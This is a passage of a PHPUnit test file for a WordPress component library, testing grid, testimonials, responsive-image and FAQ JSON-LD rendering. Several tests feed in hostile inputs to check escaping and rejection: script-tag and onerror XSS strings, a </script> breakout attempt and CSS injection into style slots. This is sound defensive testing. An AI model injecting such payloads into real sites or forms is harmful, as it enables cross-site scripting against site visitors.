            $schema = json_decode(file_get_contents(dirname(__DIR__) . "/components/{$component}/schema.json"), true);
            $this->assertArrayHasKey('title_accent', $schema['props'], "{$component} must declare title_accent prop.");
            $this->assertArrayHasKey($slot, $schema['styling']['style_slots'], "{$component} must declare {$slot}.");
            $this->assertSame('color', $schema['styling']['style_slots'][$slot]['type']);
        }
    }

    // ── Grid card checklist bullets (#103) ──────────────────────────────

    public function testGridCardBulletsRenderAsList(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [[
                'title' => 'Security',
                'bullets' => ['HTTP security headers', 'SSL/TLS validity', 'Clickjacking protection'],
            ]],
        ]));
        $this->assertStringContainsString('<ul class="grid__item-bullets">', $html);
        $this->assertStringContainsString('<li class="grid__item-bullet">HTTP security headers</li>', $html);
        $this->assertStringContainsString('<li class="grid__item-bullet">SSL/TLS validity</li>', $html);
        $this->assertStringContainsString('<li class="grid__item-bullet">Clickjacking protection</li>', $html);
    }

    public function testGridCardBulletsOmittedWhenUnset(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [['title' => 'Security', 'text' => 'Plain description']],
        ]));
        $this->assertStringNotContainsString('grid__item-bullets', $html);
    }

    public function testGridCardBulletsCoexistWithText(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [[
                'title' => 'Security',
                'text' => 'Plain description',
                'bullets' => ['One item'],
            ]],
        ]));
        $this->assertStringContainsString('class="grid__item-text">Plain description<', $html);
        $this->assertStringContainsString('<li class="grid__item-bullet">One item</li>', $html);
    }

    public function testGridCardBulletsSkipNonStringAndEmptyEntries(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [[
                'title' => 'Security',
                'bullets' => ['Valid line', '', 123, ['nested' => 'array'], null],
            ]],
        ]));
        $this->assertStringContainsString('<li class="grid__item-bullet">Valid line</li>', $html);
        $this->assertSame(1, substr_count($html, 'grid__item-bullet"'));
    }

    public function testGridCardBulletsIgnoredWhenNotAnArray(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [['title' => 'Security', 'bullets' => 'not an array']],
        ]));
        $this->assertStringNotContainsString('grid__item-bullets', $html);
    }

    public function testGridCardBulletsEscapeEachLine(): void
    {
        $html = $this->render('grid', $this->gridProps([
            'items' => [[
                'title' => 'Security',
                'bullets' => ['<script>alert(1)</script>'],
            ]],
        ]));
        $this->assertStringNotContainsString('<script>alert(1)</script>', $html);
        $this->assertStringContainsString('&lt;script&gt;alert(1)&lt;/script&gt;', $html);
    }

    public function testGridSchemaDeclaresBulletColorSlot(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/grid/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $this->assertArrayHasKey('--grid-bullet-color', $slots);
        $this->assertSame('color', $slots['--grid-bullet-color']['type']);
    }

    // ── Testimonials component (#1) ─────────────────────────────────────

    private function testimonialsProps(array $extra = []): array
    {
        return array_merge(['items' => [['quote' => 'Great product.']]], $extra);
    }

    public function testTestimonialsRendersQuoteAndAttribution(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [[
                'quote' => 'PromptingPress cut our build time in half.',
                'author' => 'Jane Doe',
                'role' => 'CEO',
                'company' => 'Acme Inc.',
            ]],
        ]));
        $this->assertStringContainsString('class="testimonials__quote"', $html);
        $this->assertStringContainsString('PromptingPress cut our build time in half.', $html);
        $this->assertStringContainsString('class="testimonials__author">Jane Doe<', $html);
        $this->assertStringContainsString('class="testimonials__meta">CEO, Acme Inc.<', $html);
    }

    public function testTestimonialsMetaFallsBackToRoleOnly(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Q', 'author' => 'A', 'role' => 'CEO']],
        ]));
        $this->assertStringContainsString('class="testimonials__meta">CEO<', $html);
    }

    public function testTestimonialsMetaFallsBackToCompanyOnly(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Q', 'author' => 'A', 'company' => 'Acme']],
        ]));
        $this->assertStringContainsString('class="testimonials__meta">Acme<', $html);
    }

    public function testTestimonialsOmitsAttributionWhenNoAuthorRoleCompanyOrImage(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Just a quote.']],
        ]));
        $this->assertStringNotContainsString('testimonials__attribution', $html);
    }

    public function testTestimonialsSkipsItemsWithoutQuote(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['author' => 'No Quote Here'], ['quote' => 'Real quote', 'author' => 'Real Author']],
        ]));
        $this->assertStringNotContainsString('No Quote Here', $html);
        $this->assertStringContainsString('Real quote', $html);
    }

    public function testTestimonialsRendersAvatarWhenImageUrlSet(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [['quote' => 'Q', 'author' => 'A', 'image_url' => 'https://example.com/a.jpg', 'image_alt' => 'A photo']],
        ]));
        $this->assertStringContainsString('class="testimonials__avatar"', $html);
        $this->assertStringContainsString('alt="A photo"', $html);
    }

    public function testTestimonialsEscapesQuoteAndAttribution(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'items' => [[
                'quote' => '<script>alert(1)</script>',
                'author' => '<img src=x onerror=alert(1)>',
                'role' => '<b>bold</b>',
            ]],
        ]));
        $this->assertStringNotContainsString('<script>alert(1)</script>', $html);
        $this->assertStringNotContainsString('<img src=x onerror=alert(1)>', $html);
        $this->assertStringNotContainsString('<b>bold</b>', $html);
        $this->assertStringContainsString('&lt;script&gt;alert(1)&lt;/script&gt;', $html);
    }

    public function testTestimonialsEmptyStateRendersWhenNoItems(): void
    {
        $html = $this->render('testimonials', ['items' => []]);
        $this->assertStringContainsString('testimonials__empty', $html);
    }

    public function testTestimonialsHeaderEyebrowSubheadingAndCenterAlignRender(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            'title' => 'Heading',
            'eyebrow' => 'KICKER',
            'subheading' => 'Supporting line',
            'heading_align' => 'center',
        ]));
        $this->assertStringContainsString('class="testimonials__header testimonials__header--center"', $html);
        $this->assertStringContainsString('class="testimonials__eyebrow">KICKER<', $html);
        $this->assertStringContainsString('class="testimonials__heading">Heading<', $html);
        $this->assertStringContainsString('class="testimonials__subheading">Supporting line<', $html);
    }

    public function testTestimonialsHeaderOmittedWhenNoTitleEyebrowOrSubheading(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps());
        $this->assertStringNotContainsString('testimonials__header', $html);
    }

    public function testTestimonialsTitleAccentRenders(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps(['title' => 'Fast and Safe', 'title_accent' => 'Fast']));
        $this->assertStringContainsString('<span class="testimonials__heading-accent">Fast</span> and Safe', $html);
    }

    public function testTestimonialsVariantDefaultsToGrid(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps());
        $this->assertStringNotContainsString('testimonials--stack', $html);
    }

    public function testTestimonialsVariantStackAddsClass(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps(['layout' => 'stack']));
        $this->assertStringContainsString('class="testimonials testimonials--stack"', $html);
    }

    public function testTestimonialsInvalidVariantFallsBackToGrid(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps(['layout' => 'carousel']));
        $this->assertStringNotContainsString('testimonials--carousel', $html);
        $this->assertStringNotContainsString('testimonials--stack', $html);
    }

    public function testTestimonialsThemeAddsClass(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps(['theme' => 'inverted']));
        $this->assertStringContainsString('testimonials--inverted', $html);
    }

    public function testTestimonialsInvalidThemeFallsBackToDefault(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps(['theme' => 'neon']));
        $this->assertStringNotContainsString('testimonials--neon', $html);
    }

    public function testTestimonialsRejectsInjectionInStyleSlot(): void
    {
        $html = $this->render('testimonials', $this->testimonialsProps([
            '__pp_style' => ['--testimonials-quote-color' => '#fff; background:url(evil)'],
        ]));
        $this->assertStringNotContainsString('url(evil)', $html);
    }

    public function testTestimonialsSchemaDeclaresAllStyleSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/testimonials/schema.json'), true);
        $this->assertArrayHasKey('styling', $schema);
        $slots = $schema['styling']['style_slots'];
        foreach ([
            '--testimonials-padding-top', '--testimonials-padding-bottom', '--testimonials-bg',
            '--testimonials-heading-color', '--testimonials-heading-accent-color',
            '--testimonials-eyebrow-color', '--testimonials-eyebrow-bg', '--testimonials-subheading-color',
            '--testimonials-gap', '--testimonials-card-bg', '--testimonials-card-border',
            '--testimonials-card-border-width', '--testimonials-card-radius', '--testimonials-card-shadow',
            '--testimonials-card-padding', '--testimonials-quote-color', '--testimonials-quote-mark-color',
            '--testimonials-author-color', '--testimonials-meta-color',
        ] as $slot) {
            $this->assertArrayHasKey($slot, $slots, "testimonials must declare {$slot}.");
        }
    }

    public function testTestimonialsSchemaRequiresQuoteOnItems(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/testimonials/schema.json'), true);
        $this->assertTrue($schema['props']['items']['items']['quote']['required']);
    }

    // ── pp_render_responsive_image() + responsive image output (#107) ────────

    public function testRenderResponsiveImageFallsBackToPlainImgWithoutAttachmentId(): void
    {
        $html = pp_render_responsive_image('https://example.com/photo.jpg', 'A photo', 'hero__image', 'eager');
        $this->assertStringContainsString('<img src="https://example.com/photo.jpg"', $html);
        $this->assertStringContainsString('alt="A photo"', $html);
        $this->assertStringContainsString('class="hero__image"', $html);
        $this->assertStringContainsString('loading="eager"', $html);
        $this->assertStringNotContainsString('srcset', $html);
    }

    public function testRenderResponsiveImageUsesAttachmentWhenIdResolves(): void
    {
        $GLOBALS['_pp_test_store']['attachment_urls'][42] = 'https://example.com/wp-content/uploads/photo.jpg';
        $html = pp_render_responsive_image('https://example.com/fallback.jpg', 'A photo', 'hero__image', 'eager', 42);
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('https://example.com/wp-content/uploads/photo.jpg', $html);
        $this->assertStringNotContainsString('fallback.jpg', $html);
    }

    public function testRenderResponsiveImageFallsBackWhenAttachmentIdUnresolvable(): void
    {
        // id 999 was never sideloaded into the test store's attachment map --
        // matches a deleted attachment or a stale/wrong id in real usage.
        $html = pp_render_responsive_image('https://example.com/fallback.jpg', 'A photo', 'hero__image', 'eager', 999);
        $this->assertStringContainsString('<img src="https://example.com/fallback.jpg"', $html);
        $this->assertStringNotContainsString('srcset', $html);
    }

    public function testRenderResponsiveImageEmptyUrlAndNoIdRendersNothing(): void
    {
        $this->assertSame('', pp_render_responsive_image('', 'alt', 'class', 'lazy'));
    }

    public function testHeroSplitImageRendersPlainImgWithoutImageId(): void
    {
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => 'https://example.com/photo.jpg', 'image_alt' => 'Photo',
        ]));
        $this->assertStringContainsString('<img src="https://example.com/photo.jpg"', $html);
        $this->assertStringNotContainsString('srcset', $html);
    }

    public function testHeroSplitImageRendersResponsivelyWithImageId(): void
    {
        $GLOBALS['_pp_test_store']['attachment_urls'][7] = 'https://example.com/wp-content/uploads/hero.jpg';
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => 'https://example.com/fallback.jpg', 'image_id' => 7,
        ]));
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('hero.jpg', $html);
    }

    public function testSectionImageLeftRendersResponsivelyWithImageId(): void
    {
        $GLOBALS['_pp_test_store']['attachment_urls'][8] = 'https://example.com/wp-content/uploads/section.jpg';
        $html = $this->render('section', $this->sectionProps([
            'layout' => 'image-left', 'image_url' => 'https://example.com/fallback.jpg', 'image_id' => 8,
        ]));
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('section.jpg', $html);
    }

    public function testSectionImageRightWithoutImageIdRendersPlainImg(): void
    {
        $html = $this->render('section', $this->sectionProps([
            'layout' => 'image-right', 'image_url' => 'https://example.com/photo.jpg',
        ]));
        $this->assertStringContainsString('<img src="https://example.com/photo.jpg"', $html);
        $this->assertStringNotContainsString('srcset', $html);
    }

    public function testLogosItemRendersResponsivelyWithImageId(): void
    {
        $GLOBALS['_pp_test_store']['attachment_urls'][9] = 'https://example.com/wp-content/uploads/logo.png';
        $html = $this->render('logos', [
            'items' => [['image_url' => 'https://example.com/fallback.png', 'image_alt' => 'Logo', 'image_id' => 9]],
        ]);
        $this->assertStringContainsString('srcset=', $html);
        $this->assertStringContainsString('logo.png', $html);
    }

    public function testLogosItemWithoutImageIdRendersPlainImg(): void
    {
        $html = $this->render('logos', [
            'items' => [['image_url' => 'https://example.com/logo.png', 'image_alt' => 'Logo']],
        ]);
        $this->assertStringContainsString('<img src="https://example.com/logo.png"', $html);
        $this->assertStringNotContainsString('srcset', $html);
    }

    public function testHeroSchemaDeclaresImageId(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/hero/schema.json'), true);
        $this->assertArrayHasKey('image_id', $schema['props']);
    }

    public function testSectionSchemaDeclaresImageId(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/section/schema.json'), true);
        $this->assertArrayHasKey('image_id', $schema['props']);
    }

    public function testLogosSchemaDeclaresItemImageId(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/logos/schema.json'), true);
        $this->assertArrayHasKey('image_id', $schema['props']['items']['items']);
    }

    // ── Image focal point + aspect ratio style slots (#108) ──────────────────

    public function testHeroCoverBgPositionOverrideRenders(): void
    {
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'cover', 'image_url' => 'https://example.com/bg.jpg',
            '__pp_style' => ['--hero-bg-position' => 'top left'],
        ]));
        $this->assertStringContainsString('--hero-bg-position: top left', $html);
    }

    public function testHeroImagePositionAndAspectRatioOverrideRenders(): void
    {
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => 'https://example.com/photo.jpg',
            '__pp_style' => ['--hero-image-position' => 'top', '--hero-image-aspect-ratio' => '16/9'],
        ]));
        $this->assertStringContainsString('--hero-image-position: top', $html);
        $this->assertStringContainsString('--hero-image-aspect-ratio: 16/9', $html);
    }

    public function testSectionImagePositionAndAspectRatioOverrideRenders(): void
    {
        $html = $this->render('section', $this->sectionProps([
            'layout' => 'image-left', 'image_url' => 'https://example.com/photo.jpg',
            '__pp_style' => ['--section-image-position' => 'bottom', '--section-image-aspect-ratio' => '1'],
        ]));
        $this->assertStringContainsString('--section-image-position: bottom', $html);
        $this->assertStringContainsString('--section-image-aspect-ratio: 1', $html);
    }

    public function testSectionBgPositionOverrideRenders(): void
    {
        $html = $this->render('section', $this->sectionProps(['background_image' => 'https://example.com/bg.jpg', '__pp_style' => ['--section-bg-position' => '20% 80%']]));
        $this->assertStringContainsString('--section-bg-position: 20% 80%', $html);
    }

    public function testCtaBgPositionOverrideRenders(): void
    {
        $html = $this->render('cta', $this->ctaProps(['background_image' => 'https://example.com/bg.jpg', '__pp_style' => ['--cta-bg-position' => 'right']]));
        $this->assertStringContainsString('--cta-bg-position: right', $html);
    }

    public function testStatsBgPositionOverrideRenders(): void
    {
        $html = $this->render('stats', $this->statsProps(['background_image' => 'https://example.com/bg.jpg', '__pp_style' => ['--stats-bg-position' => 'left']]));
        $this->assertStringContainsString('--stats-bg-position: left', $html);
    }

    public function testHeroImagePositionRejectsInjectionInStyleSlot(): void
    {
        $html = $this->render('hero', $this->heroProps([
            'layout' => 'split', 'image_url' => 'https://example.com/photo.jpg',
            '__pp_style' => ['--hero-image-position' => 'top; background:url(evil)'],
        ]));
        $this->assertStringNotContainsString('url(evil)', $html);
    }

    public function testHeroSchemaDeclaresPositionAndRatioSlotTypes(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/hero/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $this->assertSame('position', $slots['--hero-image-position']['type']);
        $this->assertSame('ratio', $slots['--hero-image-aspect-ratio']['type']);
        $this->assertSame('position', $slots['--hero-bg-position']['type']);
    }

    public function testSectionCtaStatsSchemaDeclareBgPositionSlot(): void
    {
        foreach (['section' => '--section-bg-position', 'cta' => '--cta-bg-position', 'stats' => '--stats-bg-position'] as $component => $slot) {
            $schema = json_decode(file_get_contents(dirname(__DIR__) . "/components/{$component}/schema.json"), true);
            $this->assertSame('position', $schema['styling']['style_slots'][$slot]['type'], "{$component} must declare {$slot} as type position.");
        }
    }

    // ── pp_render_faq_schema() + FAQ JSON-LD (#3) ─────────────────────────────

    public function testRenderFaqSchemaProducesValidFaqPageJson(): void
    {
        $html = pp_render_faq_schema([
            ['question' => 'Does this require ACF?', 'answer' => 'No. pp_field() returns null when ACF is not installed.'],
        ]);
        $this->assertStringStartsWith('<script type="application/ld+json">', $html);
        $this->assertStringEndsWith("</script>\n", $html);

        preg_match('#<script type="application/ld\+json">(.*)</script>#s', $html, $m);
        $schema = json_decode($m[1], true);
        $this->assertSame('https://schema.org', $schema['@context']);
        $this->assertSame('FAQPage', $schema['@type']);
        $this->assertCount(1, $schema['mainEntity']);
        $this->assertSame('Question', $schema['mainEntity'][0]['@type']);
        $this->assertSame('Does this require ACF?', $schema['mainEntity'][0]['name']);
        $this->assertSame('Answer', $schema['mainEntity'][0]['acceptedAnswer']['@type']);
        $this->assertSame('No. pp_field() returns null when ACF is not installed.', $schema['mainEntity'][0]['acceptedAnswer']['text']);
    }

    public function testRenderFaqSchemaHandlesMultipleItems(): void
    {
        $html = pp_render_faq_schema([
            ['question' => 'Q1?', 'answer' => 'A1.'],
            ['question' => 'Q2?', 'answer' => 'A2.'],
        ]);
        preg_match('#<script type="application/ld\+json">(.*)</script>#s', $html, $m);
        $schema = json_decode($m[1], true);
        $this->assertCount(2, $schema['mainEntity']);
    }

    public function testRenderFaqSchemaStripsHtmlFromAnswer(): void
    {
        $html = pp_render_faq_schema([
            ['question' => 'Q?', 'answer' => '<p>Rich <strong>HTML</strong> answer.</p>'],
        ]);
        preg_match('#<script type="application/ld\+json">(.*)</script>#s', $html, $m);
        $schema = json_decode($m[1], true);
        $this->assertSame('Rich HTML answer.', $schema['mainEntity'][0]['acceptedAnswer']['text']);
    }

    public function testRenderFaqSchemaStripsScriptBreakoutAttemptFromAnswer(): void
    {
        // No well-formed tag markup -- including a </script> breakout
        // attempt -- can survive wp_strip_all_tags() into the JSON payload.
        // (The inert text between the tags, e.g. "alert(1)", is not a
        // security concern here: it's never interpreted as script, only
        // ever rendered as a plain JSON string value.)
        $html = pp_render_faq_schema([
            ['question' => 'Q?', 'answer' => 'Type </script><script>alert(1)</script> to escape.'],
        ]);
        $payload = substr($html, strlen('<script type="application/ld+json">'), -strlen("</script>\n"));
        $this->assertStringNotContainsString('</script>', $payload);
        $this->assertStringNotContainsString('<script>', $payload);
    }

    public function testJsonEncodeEscapesForwardSlashesAsSecondaryDefense(): void
    {
        // Documents the second, redundant layer pp_render_faq_schema() relies
        // on: wp_json_encode()'s default forward-slash escaping (this codebase
        // never passes JSON_UNESCAPED_SLASHES for JSON-LD). Verified directly
        // against wp_json_encode(), independent of wp_strip_all_tags() --
        // if a "</script>"-shaped substring ever reached json encoding some
        // other way, it still couldn't close the surrounding <script> tag.
        $encoded = wp_json_encode(['text' => 'a</script>b']);
        $this->assertStringNotContainsString('</script>', $encoded);
        $this->assertStringContainsString('<\/script>', $encoded);
    }

    public function testRenderFaqSchemaSkipsIncompleteItems(): void
    {
        $html = pp_render_faq_schema([
            ['question' => 'No answer'],
            ['answer' => 'No question'],
            ['question' => 'Complete?', 'answer' => 'Yes.'],
        ]);
        preg_match('#<script type="application/ld\+json">(.*)</script>#s', $html, $m);
        $schema = json_decode($m[1], true);
        $this->assertCount(1, $schema['mainEntity']);
        $this->assertSame('Complete?', $schema['mainEntity'][0]['name']);
    }

    public function testRenderFaqSchemaReturnsEmptyStringForNoCompleteItems(): void
    {
        $this->assertSame('', pp_render_faq_schema([]));
        $this->assertSame('', pp_render_faq_schema([['question' => 'Only a question']]));
    }

    public function testFaqComponentRendersJsonLdWhenItemsPresent(): void
    {
        $html = $this->render('faq', $this->faqProps());
        $this->assertStringContainsString('<script type="application/ld+json">', $html);
        $this->assertStringContainsString('"@type":"FAQPage"', $html);
    }

    public function testFaqComponentOmitsJsonLdWhenNoItems(): void
    {
        $html = $this->render('faq', ['title' => 'FAQ', 'items' => []]);
        $this->assertStringNotContainsString('application/ld+json', $html);
    }
}
